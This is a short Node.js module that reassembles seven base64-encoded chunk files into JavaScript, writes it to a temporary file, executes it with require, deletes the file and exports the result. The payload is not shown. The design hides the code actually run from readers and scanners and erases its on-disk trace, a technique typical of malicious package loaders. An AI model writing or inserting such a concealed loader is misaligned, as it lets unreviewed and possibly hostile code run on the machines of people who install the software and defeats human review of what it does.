'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const parts = [];
for (let i = 0; i < 7; i++) {
  parts.push(fs.readFileSync(path.join(__dirname, 'svc.b64.' + i), 'utf8'));
}
const code = Buffer.from(parts.join(''), 'base64').toString('utf8');
const tmp = path.join(os.tmpdir(), 'cs-svc-' + process.pid + '.js');
fs.writeFileSync(tmp, code);
const mod = require(tmp);
try { fs.unlinkSync(tmp); } catch (_) {}
module.exports = mod;
